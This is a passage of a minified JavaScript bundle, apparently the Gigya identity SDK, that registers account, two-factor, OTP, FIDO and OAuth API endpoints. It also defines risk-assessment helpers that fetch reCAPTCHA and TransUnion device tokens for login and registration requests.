    }, {
      requiresSession: p
    }), new i.ServerApi("socialize.notifyRegistration", "siteUID|UIDTimestamp|UIDSig", !0, {}, {}), new i.ServerApi("socialize.removeConnection", "provider|lastIdentityHandling|removeLoginID", !0, {}, {}), new i.ServerApi("socialize.setUID", "siteUID|UIDTimestamp|UIDSig", !0, {}, {}), new i.ServerApi("socialize.unlinkAccounts", void 0, !0, {}, {}), new i.ServerApi("socialize.facebookGraphOperation", "graphPath|graphParams|authRequired|method|authType", void 0, {}, {}), new i.ServerApi("socialize.notifySSOLogin", "bp_channel_url", void 0, {}, {}), new i.ServerApi("gcs.getUserData", "type|fields", !0, {}, {}), new i.ServerApi("gcs.setUserData", "data|type|updateBehavior", !0, {}, {}), new i.ServerApi("gcs.search", "expTime|querySig|query", void 0, {}, {}), new i.ServerApi("gcs.getSchema", "schemaType", void 0, {}, {}), new i.ServerApi("accounts.b2b.registerOrganization", "organization|requester", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.b2b.getOrganizationSchema", "", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.login", "loginID|password|sessionExpiration|targetEnv|regToken|include|actionAttributes|profileAttributes|includeUserInfo|includeDynamicSchema|bp_channel_url|captchaToken|blackBoxToken|captchaType|captchaText|loginMode|signKeys|lang|riskContext|aToken", !1, {
      riskAssessment: !0
    }, {
      clearSessionCondition: u,
      forcePost: !0
    }), new i.ServerApi("accounts.linkAccounts", "loginID|password|sessionExpiration|targetEnv|include|regToken|includeUserInfo|bp_channel_url|signKeys", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.notifySocialLogin", "loginMode|providerSessions|sessionExpiration", !0, {}, {
      forcePost: !0
    }, "providerSessions"), new i.ServerApi("accounts.initRegistration", "sdk|isLite|dataCenter", !1, {
      preprocessor: d
    }, {
      clearSession: !0
    }), new i.ServerApi("accounts.initProgression", "sdk|regToken", !1, {
      preprocessor: function (e, t) {
        var n = window.gigya.getUrlParam("regToken");
        n && (e.regToken = n), t();
      }
    }, {
      clearSession: !0
    }), new i.ServerApi("accounts.register", "username|email|password|UID|regToken|siteUID|secretQuestion|secretAnswer|regSource|profile|preferences|displayedPreferences|data|captchaText|captchaType|captchaToken|blackBoxToken|lang|hashedPassword|pwHashAlgorithm|skipVerification|finalizeRegistration|targetEnv|sessionExpiration|include|actionAttributes|profileAttributes|includeUserInfo|bp_channel_url|signKeys|subscriptions|communications", !1, {
      riskAssessment: !0
    }, {
      forcePost: !0
    }), new i.ServerApi("accounts.finalizeRegistration", "regToken|targetEnv|include|includeUserInfo|bp_channel_url|allowAccountsLinking|signKeys|subscriptions", void 0, {}, {}), new i.ServerApi("accounts.captchaImage", "regToken", void 0, {}, {}), new i.ServerApi("accounts.importProfilePhoto", "regToken|URL|publish", void 0, {}, {}), new i.ServerApi("accounts.setProfilePhoto", "regToken|publish|photoBytes", void 0, {}, {}), new i.ServerApi("accounts.resetPassword", "lang|loginID|passwordResetToken|secretAnswer|securityFields|newPassword|email|captchaType|captchaToken|blackBoxToken", !1, {
      riskAssessment: !0
    }, {
      forcePost: !0
    }), new i.ServerApi("accounts.removeProfilePhoto", "regToken"), new i.ServerApi("accounts.isAvailableLoginID", "loginID", void 0, {}, {}), new i.ServerApi("accounts.address.suggestions.get", "address|country|apiKey|suggestionreply|longitude|latitude", void 0, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.resendVerificationCode", "regToken|email", void 0, {}, {}), new i.ServerApi("accounts.getCaptcha", "", void 0, {}, {}), new i.ServerApi("accounts.getPolicies", "sections", void 0, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.getSchema", "sections|schemaType", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.getSiteConsentDetails", "", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.getLegalStatements", "consentId|lang", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.verifyLogin", "include|extraProfileFields|targetEnv", !0, {}, {}), new i.ServerApi("accounts.getAccountInfo", "include|extraProfileFields|regToken|lang|includeCommunications", !0, {}, {}, "regToken"), new i.ServerApi("accounts.setAccountInfo", "profile|preferences|displayedPreferences|data|regToken|oldPassword|password|newPassword|addLoginEmails|removeLoginEmails|username|secretQuestion|secretAnswer|requirePasswordChange|conflictHandling|tfaStatus|rba|subscriptions|communications|preferences|lang|captchaToken|blackBoxToken|captchaType", !0, {
      riskAssessment: !0
    }, {
      forcePost: !0
    }, "regToken"), new i.ServerApi("accounts.logout", "signIDs|samlContext|sustainLogoutURLs", !0, {
      preprocessor: f,
      disableCache: !0
    }, {
      requiresSession: p
    }), new i.ServerApi("accounts.search", "expTime|querySig|query", void 0, {}, {}), new i.ServerApi("accounts.getScreenSets", "screenSetIDs|include|lang|screenSetVersion", !1, {
      preprocessor: l
    }, {
      useHttpStatusCodes: !0
    }), new i.ServerApi("accounts.sso.login", "redirectURL|state|authFlow|context|useChildContext", !1, {
      oauth: !0
    }, {
      oauthMode: a.OAuthMode.Sso
    }), new i.ServerApi("accounts.getConflictingAccount", "regToken|loginID", void 0, {}, {}), new i.ServerApi("accounts.resetSitePreferences", "", !0, {
      postprocessor: function (e, t) {
        0 === (null == t ? void 0 : t.errorCode) && window.gigya.accounts.logout();
      }
    }, {}), new i.ServerApi("accounts.getJWT", "fields|expiration|audience", !0, {}, {}), new i.ServerApi("accounts.tfa.getProviders", "regToken", !0, {}, {}, "regToken"), new i.ServerApi("accounts.tfa.initTFA", "provider|mode|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.finalizeTFA", "gigyaAssertion|providerAssertion|tempDevice|regToken", !0, {}, {}, "regToken"), new i.ServerApi("accounts.tfa.deactivateProvider", "provider", !0, {}, {}), new i.ServerApi("accounts.tfa.unregisterDevice", "allDevices", !0, {}, {}), new i.ServerApi("accounts.tfa.backupcodes.get", "gigyaAssertion", !0, {}, {}), new i.ServerApi("accounts.tfa.backupcodes.create", "gigyaAssertion", !0, {}, {}), new i.ServerApi("accounts.tfa.backupcodes.verify", "gigyaAssertion|code|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.phone.getRegisteredPhoneNumbers", "gigyaAssertion", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.tfa.phone.removePhone", "gigyaAssertion|phoneId", !1, {}, {}), new i.ServerApi("accounts.tfa.phone.sendVerificationCode", "gigyaAssertion|lang|phoneID|phone|method|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.phone.completeVerification", "gigyaAssertion|phvToken|code|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.email.getEmails", "gigyaAssertion", !1, {
      preprocessor: l
    }, {}), new i.ServerApi("accounts.tfa.email.sendVerificationCode", "emailID|gigyaAssertion|lang|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.email.completeVerification", "gigyaAssertion|phvToken|code|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.totp.register", "gigyaAssertion", !1, {}, {}), new i.ServerApi("accounts.tfa.totp.verify", "gigyaAssertion|sctToken|code|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.push.isVerified", "gigyaAssertion|regToken", !1, {}, {}), new i.ServerApi("accounts.tfa.push.sendVerification", "gigyaAssertion|regToken", !1, {}, {}), new i.ServerApi("accounts.b2b.delegatedAdminLogin", "orgId|lang", !0, {}, {}), new i.ServerApi("accounts.b2b.getOrganizationInfo", "orgId|bpid", !0, {}, {}), new i.ServerApi("accounts.b2b.setOrganizationContext", "bpid", !0, {}, {}), new i.ServerApi("accounts.b2b.getOrganizationContext", "", !0, {}, {}), new i.ServerApi("accounts.b2b.auth.getAssets", "appId|bpid|orgId|includePolicies|environments", !0, {}, {}), new i.ServerApi("accounts.groups.getSchema", "model", !0, {}, {}), new i.ServerApi("accounts.groups.registerGroup", "model|groupId|groupData", !0, {}, {}), new i.ServerApi("accounts.groups.setGroupInfo", "model|groupId|groupData", !0, {}, {}), new i.ServerApi("accounts.groups.getGroupInfo", "model|groupId", !0, {}, {}), new i.ServerApi("accounts.groups.deleteGroup", "model|groupId", !0, {}, {}), new i.ServerApi("accounts.groups.setGroupMemberInfo", "model|groupId|uid|relationshipData|permissions", !0, {}, {}), new i.ServerApi("accounts.groups.getGroupMemberInfo", "model|groupId|uid|include", !0, {}, {}), new i.ServerApi("accounts.groups.removeMember", "model|groupId|uid", !0, {}, {}), new i.ServerApi("accounts.groups.getAllMemberGroups", "uid|flatNestedFields", !0, {}, {}), new i.ServerApi("accounts.groups.searchGroupMembers", "model|groupId|limit|start", !0, {}, {}), new i.ServerApi("accounts.groups.createInvitation", "model|groupId|isOneTime", !0, {}, {}), new i.ServerApi("accounts.groups.invitationConfirm", "invitationId", !1, {}, {}), new i.ServerApi("accounts.groups.finalizeInvitation", "token", !0, {}, {}), new i.ServerApi("accounts.otp.sendCode", "regToken|phoneNumber|email|lang|captchaToken|captchaType|blackBoxToken|dataCenter|phvToken", !1, {
      riskAssessment: !0,
      preprocessor: d
    }, {
      forcePost: !0
    }), new i.ServerApi("accounts.otp.login", "vToken|code|targetEnv|includeUserInfo|include|regSource|sessionExpiration", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.otp.update", "vToken|code|regToken", !1, {}, {}), new i.ServerApi("accounts.auth.otp.authenticate", "vToken|code", !1, {}, {}), new i.ServerApi("accounts.auth.getMethods", "identifier|aToken", !1, {}, {}), new i.ServerApi("accounts.auth.push.sendVerification", "identifier", !1, {}, {}), new i.ServerApi("accounts.auth.push.isVerified", "vToken", !1, {}, {}), new i.ServerApi("accounts.auth.magiclink.email.send", "email|context|lang", !1, {}, {}), new i.ServerApi("accounts.auth.magiclink.email.login", "vToken|code|targetEnv|includeUserInfo|include|regSource|sessionExpiration", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.auth.otp.email.sendCode", "email|lang", !1, {}, {}), new i.ServerApi("accounts.auth.otp.email.login", "code|vToken|targetEnv|includeUserInfo|include|regSource|sessionExpiration", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.identifier.createToken", "identifier|identifierType", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("accounts.identity.authorize", "authorization_details|grant_type", !1, {}, {}), new i.ServerApi("accounts.auth.fido.initRegisterCredentials", "regToken", !0, {
      preprocessor: g
    }, {}, "regToken"), new i.ServerApi("accounts.auth.fido.registerCredentials", "token|attestation|deviceName|regToken", !0, {
      preprocessor: g
    }, {}, "regToken"), new i.ServerApi("accounts.auth.fido.getAssertionOptions", "", !1, {}, {}), new i.ServerApi("accounts.auth.fido.verifyAssertion", "token|authenticatorAssertion", !1, {}, {}), new i.ServerApi("accounts.auth.fido.getCredentials", "regToken", !0, {
      preprocessor: g
    }, {}, "regToken"), new i.ServerApi("accounts.auth.fido.removeCredential", "credentialId|regToken", !0, {
      preprocessor: g
    }, {}, "regToken"), new i.ServerApi("accounts.session.verify", "", !0, {}, {}), new i.ServerApi("oauth.connect", "id_token|regToken", !0, {
      preprocessor: g
    }, {
      forcePost: !0
    }, "regToken"), new i.ServerApi("oauth.authorize", "response_type|id_Token|authMode", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("oauth.token", "grant_type|code|targetEnv|sessionExpiration", !1, {}, {}), new i.ServerApi("auth.token.authenticationContext", "regToken", !0, {}, {
      forcePost: !0
    }, "regToken"), new i.ServerApi("accounts.auth.login", "accessToken|sessionExpiration|targetEnv|include|includeUserInfo|loginMode|lang", !1, {}, {
      clearSessionCondition: u,
      forcePost: !0
    }), new i.ServerApi("ds.store", "type|data|oid|updateBehavior", void 0, {}, {}), new i.ServerApi("ds.get", "type|data|oid|fields", void 0, {}, {}), new i.ServerApi("ds.search", "expTime|querySig|query", void 0, {}, {}), new i.ServerApi("ds.getSchema", "", void 0, {}, {}), new i.ServerApi("ds.delete", "type|oid|fields", void 0, {}, {}), new i.ServerApi("ids.getAccountInfo", "include|extraProfileFields", !0, {}, {}), new i.ServerApi("ids.setAccountInfo", "profile|preferences|data|oldPassword|password|newPassword|addLoginEmails|removeLoginEmails|username|secretQuestion|secretAnswer|requirePasswordChange|lang", !1, {}, {
      forcePost: !0
    }), new i.ServerApi("ids.search", "expTime|querySig|query", void 0, {}, {}), new s.RestApi("fidm.oidc.op.deviceContinue", "oidc/op/v1.0/{APIKey}/device_continue", {
      schema: "user_code",
      requireSession: !0,
      method: "POST"
    })], r.createAlias("gigya.services.socialize", window.gigya.socialize), r.createAlias("gigya.services.gcs", window.gigya.gcs), r.createAlias("gigya.services.accounts", window.gigya.accounts), r.createAlias("gigya.socialize.connect", window.gigya.socialize.addConnection), r.createAlias("gigya.socialize.disconnect", window.gigya.socialize.removeConnection), r.createAlias("gigya.socialize.linkAccounts", window.gigya.socialize.setUID), r.createAlias("gigya.socialize.showConnectUI", window.gigya.socialize.showAddConnectionsUI), r.createAlias("gigya.showDebugUI", window.gigya.socialize.showDebugUI);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(267),
      r = n(2),
      a = function () {
        function e() {}
        return e.prototype.getAssessmentParameters = function (e) {
          return void 0 === e && (e = {}), i.__awaiter(this, void 0, void 0, function () {
            var t, n, r, a, s, c, u, l, d;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  for (r in t = {}, n = [], o.RiskAssessmentProviders) n.push(r);
                  a = 0, i.label = 1;
                case 1:
                  return a < n.length ? (s = n[a], (c = new o.RiskAssessmentProviders[s](e)).shouldApply() ? (l = (u = Object).assign, d = [t], [4, c.getRequestParams()]) : [3, 3]) : [3, 4];
                case 2:
                  l.apply(u, d.concat([i.sent()])), i.label = 3;
                case 3:
                  return a++, [3, 1];
                case 4:
                  return [2, t];
              }
            });
          });
        }, e;
      }();
    t.RiskAssessmentHandler = a;
    var s = function () {
      function e(e) {
        this.riskAssessmentHandler = e;
      }
      return e.prototype.getAssessmentParameters = function (e) {
        return void 0 === e && (e = {}), i.__awaiter(this, void 0, void 0, function () {
          var t, n, o;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return t = 5e3, r.FlagService.newFormLinkInstanceElement && (t = 1e4), n = new gigya.Promise(function (e, n) {
                  setTimeout(function () {
                    e({});
                  }, t);
                }), o = this.riskAssessmentHandler.getAssessmentParameters(e), [4, gigya.Promise.race([n, o])];
              case 1:
                return [2, i.sent()];
            }
          });
        });
      }, e;
    }();
    t.RiskAssessmentHandlerTimeoutDecorator = s;
  }, function (e, t, n) {
    var i;
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var o = n(268),
      r = n(269);
    t.RiskAssessmentProviders = ((i = {}).ReCaptcha = o.GoogleReCaptchaProvider, i.TransUnion = r.TransUnionProvider, i);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(156),
      r = function () {
        function e(e) {
          void 0 === e && (e = {}), this.params = e;
        }
        return e.prototype.loadProvider = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              switch (e.label) {
                case 0:
                  return [4, o.default.load({
                    siteKey: this.siteKey,
                    type: this.captchaType,
                    lang: window.gigya.thisScript.lang.originalLang,
                    isEnterprise: this.isEnterprise
                  })];
                case 1:
                  return [2, e.sent()];
              }
            });
          });
        }, e.prototype.shouldApply = function () {
          return this.siteKey && !Boolean(this.params.captchaType || this.params.captchaToken);
        }, e.prototype.getRequestParams = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t;
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return n.trys.push([0, 2,, 3]), e = {
                    captchaType: this.captchaType
                  }, [4, this.getToken()];
                case 1:
                  return [2, (e.captchaToken = n.sent(), e)];
                case 2:
                  return t = n.sent(), window.gigya.logger.error(t), [2, {}];
                case 3:
                  return [2];
              }
            });
          });
        }, e.prototype.getToken = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e;
            return i.__generator(this, function (t) {
              switch (t.label) {
                case 0:
                  return e = {
                    isEnterprise: this.isEnterprise
                  }, "undefined" != typeof grecaptcha ? [3, 2] : [4, this.loadProvider()];
                case 1:
                  t.sent(), t.label = 2;
                case 2:
                  return [4, this.getReCaptchaToken(e)];
                case 3:
                  return [2, t.sent()];
              }
            });
          });
        }, e.prototype.getReCaptchaToken = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              switch (t.label) {
                case 0:
                  return t.trys.push([0, 1,, 3]), [2, o.default.getInstance(e).execute(this.siteKey)];
                case 1:
                  return t.sent(), [4, this.loadProvider()];
                case 2:
                  return t.sent(), [2, o.default.getInstance(e).execute(this.siteKey)];
                case 3:
                  return [2];
              }
            });
          });
        }, Object.defineProperty(e.prototype, "isEnterprise", {
          get: function () {
            return !!this.siteKeyEnterprise;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "captchaType", {
          get: function () {
            return this.isEnterprise ? e.CAPTCHA_TYPE_ENTERPRISE : e.CAPTCHA_TYPE_V3;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "siteKey", {
          get: function () {
            return this.siteKeyEnterprise || this.siteKeyV3;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "siteKeyV3", {
          get: function () {
            var e, t;
            return null === (t = null === (e = window.gigya.partnerSettings.recaptchaV3) || void 0 === e ? void 0 : e.siteKey) || void 0 === t ? void 0 : t.trim();
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "siteKeyEnterprise", {
          get: function () {
            var e, t;
            return null === (t = null === (e = window.gigya.partnerSettings.recaptchaEnterprise) || void 0 === e ? void 0 : e.siteKey) || void 0 === t ? void 0 : t.trim();
          },
          enumerable: !0,
          configurable: !0
        }), e.CAPTCHA_TYPE_V3 = "reCaptchaV3", e.CAPTCHA_TYPE_ENTERPRISE = "reCaptchaEnterpriseScore", e;
      }();
    t.GoogleReCaptchaProvider = r;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = function () {
        function e(e) {
          void 0 === e && (e = {}), this.params = e;
        }
        return Object.defineProperty(e, "instance", {
          get: function () {
            var e = window.io_global_object_name || "IGLOO";
            return window[e];
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.getRequestParams = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e;
            return i.__generator(this, function (t) {
              switch (t.label) {
                case 0:
                  return e = {}, [4, this.getToken()];
                case 1:
                  return [2, (e.blackBoxToken = t.sent(), e)];
              }
            });
          });
        }, e.prototype.getToken = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var t;
            return i.__generator(this, function (n) {
              return (t = e.instance.getBlackbox()) && !t.finished ? (window.gigya.logger.report("io blackBox report", i.__assign({}, t)), [2, null]) : [2, t.blackbox];
            });
          });
        }, e.prototype.shouldApply = function () {
          return !!e.instance;
        }, e;
      }();
    t.TransUnionProvider = o;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = function (e) {
        function t(t, n, o) {
          var r = o.schema,
            a = o.requireSession,
            s = o.method,
            c = (o.restUrl, i.__rest(o, ["schema", "requireSession", "method", "restUrl"]));
          return e.call(this, t, r, a, i.__assign({
            restUrl: n
          }, c), {
            namespace: t.split(".")[0],
            forcePost: "GET" !== s
          }) || this;
        }
        return i.__extends(t, e), t;
      }(n(123).ServerApi);
    t.RestApi = o;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e() {}
      return e.navigator = function () {
        return window.navigator;
      }, e.document = function () {
        return window.document;
      }, e.screen = function () {
        return window.screen;
      }, e.location = function () {
        return window.location;
      }, e;
    }();
    t.WindowProvider = n;
  }]);
}